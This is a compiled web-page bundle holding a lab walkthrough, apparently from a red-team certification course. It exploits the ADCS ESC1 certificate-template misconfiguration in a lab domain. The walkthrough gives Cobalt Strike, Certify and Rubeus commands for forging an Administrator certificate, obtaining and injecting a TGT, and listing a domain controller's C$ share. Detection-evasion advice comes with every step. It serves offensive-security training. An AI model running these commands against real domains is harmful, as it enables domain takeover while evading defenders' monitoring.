import{_ as t,o as s,c as a,am as o}from"./chunks/framework.yj4qiWdr.js";const i="/skill-issue/assets/adcs-esc1-command-hisotry.BimouWYJ.png",m=JSON.parse('{"title":"ESC1 Misconfigured Client Authentication Templates","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/labs/esc1.md","filePath":"crto/liham/labs/esc1.md"}'),n={name:"crto/liham/labs/esc1.md"};function c(r,e,l,d,p,u){return s(),a("div",null,e[0]||(e[0]=[o(`<h1 id="esc1-misconfigured-client-authentication-templates" tabindex="-1">ESC1 Misconfigured Client Authentication Templates <a class="header-anchor" href="#esc1-misconfigured-client-authentication-templates" aria-label="Permalink to &quot;ESC1 Misconfigured Client Authentication Templates&quot;">​</a></h1><blockquote><p>The objective of this lab is to identify and exploit ESC1.</p></blockquote><hr><ol><li>Launch Cobalt Strike and connect to the team server.</li><li>Interact with the medium-integrity Beacon.</li><li>Enumerate the certificate authority for vulnerable templates.</li></ol><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>spawnto x64 %windir%\\sysnative\\dllhost.exe</span></span>
<span class="line"><span>execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> — <code>execute-assembly</code> uses fork &amp; run; spawns a sacrificial process (default: <code>rundll32.exe</code> unless overridden by <code>spawnto</code>). Generates Event 4688 (process creation) if process auditing is enabled. Ensure <code>spawnto</code> is set to a less-signatured binary in your Malleable C2 profile (e.g. <code>dllhost.exe</code>).</p><p>ADCS enumeration via Certify sends LDAP queries to the domain controller — Event 1644 (LDAP query) may appear in DC logs under verbose LDAP auditing, but this is rarely monitored.</p><p><strong>Stealthier alternative:</strong> Use <code>Certutil.exe -TCAInfo</code> for basic CA enumeration (LOLBin, no assembly spawn), or <code>ldapsearch</code> via BOF to query <code>CN=Certificate Templates</code> directly without spawning a process:</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (objectClass=pKICertificateTemplate) --dn &quot;CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com&quot; --attributes name,msPKI-Certificate-Name-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage,nTSecurityDescriptor</span></span></code></pre></div><blockquote><p>ESC1 indicators in output: <code>msPKI-Certificate-Name-Flag: 1</code> (ENROLLEE_SUPPLIES_SUBJECT), <code>pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2</code> (Client Authentication), <code>msPKI-RA-Signature: 0</code> (no manager approval). Check <code>nTSecurityDescriptor</code> enrollment rights show low-privileged groups (Domain Users/Authenticated Users).</p></blockquote><p>⚠️ This should reveal a template called <em>ESC1</em>.</p><ol start="4"><li>Request a certificate, specifying the default domain Administrator&#39;s <em>UserPrincipalName</em> in the certificate&#39;s Subject Alternative Name (SAN).</li></ol><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request --ca &quot;lon-cs-1.contoso.com\\CONTOSO Root CA&quot; --template ESC1 --upn Administrator --quiet</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> — <code>execute-assembly</code> again spawns a sacrificial process. The certificate request itself generates <strong>Event 4886</strong> (Certificate Services received a certificate request) and <strong>Event 4887</strong> (approved and issued) on the CA server — these are always logged on the CA and cannot be suppressed. The cert is returned over the C2 channel and never touches disk unless you write it manually.</p><p><strong>Stealthier alternative:</strong> <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noreferrer">Certipy</a> (from Linux) can request the cert out-of-band via RPC/HTTP if you have network access to the CA, keeping the action entirely off the target beacon. In-lab, <code>execute-assembly</code> is the required path.</p></blockquote><ol start="5"><li><p>Use Rubeus to request a TGT for Administrator.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap</span></span></code></pre></div></li></ol><blockquote><p><strong>OPSEC-🟠CAUTION</strong> — <code>execute-assembly</code> spawns sacrificial process. The AS-REQ to the KDC generates <strong>Event 4768</strong> (Kerberos TGT request) on the DC — normal Kerberos traffic, but the certificate-based pre-authentication (PKINIT) can stand out in environments with baseline monitoring. Using <code>/enctype:aes256</code> is preferred over RC4 (less signatured).</p><p>The <code>/nowrap</code> flag returns the base64 ticket for capture — ticket is <strong>not</strong> injected yet. Proceed to step 6 to use it.</p><p><strong>Stealthier alternative:</strong> Add <code>/ptt</code> to the Rubeus command to inject and use immediately in one step, avoiding a second <code>execute-assembly</code> call. Only do this if you plan to use the ticket immediately — injected tickets are visible to EDR memory scanners.</p></blockquote><p>⚠️ In this lab, you have learned how to identify and exploit ESC1 to gain domain admin privileges.</p><hr><h2 id="proving-domain-admin-access-with-the-tgt-opsec-🟢safe" tabindex="-1">Proving Domain Admin Access with the TGT (OPSEC-🟢SAFE) <a class="header-anchor" href="#proving-domain-admin-access-with-the-tgt-opsec-🟢safe" aria-label="Permalink to &quot;Proving Domain Admin Access with the TGT (OPSEC-🟢SAFE)&quot;">​</a></h2><p>After obtaining the Administrator TGT, prove DA-level access without lateral movement noise.</p><h3 id="step-1-—-inject-the-ticket-into-the-beacon-session" tabindex="-1">Step 1 — Inject the ticket into the beacon session <a class="header-anchor" href="#step-1-—-inject-the-ticket-into-the-beacon-session" aria-label="Permalink to &quot;Step 1 — Inject the ticket into the beacon session&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe ptt /ticket:[BASE64_TICKET]</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> — Ticket is injected into the current beacon&#39;s logon session in-memory only. No process spawn beyond the sacrificial <code>execute-assembly</code> host process. No disk writes. No network traffic at injection time.</p></blockquote><h3 id="step-2-—-list-the-dc-c-share" tabindex="-1">Step 2 — List the DC C$ share <a class="header-anchor" href="#step-2-—-list-the-dc-c-share" aria-label="Permalink to &quot;Step 2 — List the DC C$ share&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ls \\\\lon-dc-1.contoso.com\\C$</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> — <code>ls</code> in CS uses the beacon&#39;s existing token/ticket context over SMB. Generates a <strong>Type 3 network logon (Event 4624)</strong> on the DC — indistinguishable from normal admin access. No service creation, no new process on the remote host, no lateral movement artifact. Accessing <code>C$</code> requires Domain Admin or local admin on the DC — a successful listing proves DA-level access conclusively.</p></blockquote><h3 id="alternative-—-verify-ticket-and-session-without-network-noise" tabindex="-1">Alternative — Verify ticket and session without network noise <a class="header-anchor" href="#alternative-—-verify-ticket-and-session-without-network-noise" aria-label="Permalink to &quot;Alternative — Verify ticket and session without network noise&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe klist</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> — Lists tickets in the current logon session. Confirms the Administrator TGT is present and valid before using it. No network traffic, no remote host contact.</p></blockquote><img src="`+i+'">',28)]))}const b=t(n,[["render",c]]);export{m as __pageData,b as default};
